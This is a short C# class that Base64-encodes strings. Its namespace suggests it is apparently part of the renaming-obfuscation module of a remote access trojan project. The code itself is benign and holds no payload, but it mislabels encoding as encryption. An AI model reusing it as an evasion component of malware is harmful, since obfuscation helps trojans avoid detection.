using System;
using System.Text;
using ZEDRatApp.Forms.RenamingObfuscation.Interfaces;

namespace ZEDRatApp.Forms.RenamingObfuscation.Classes
{
	public class Base64 : ICrypto
	{
		public string Encrypt(string dataPlain)
		{
			try
			{
				return Convert.ToBase64String(Encoding.UTF8.GetBytes(dataPlain));
			}
			catch (Exception)
			{
				return null;
			}
		}
	}
}
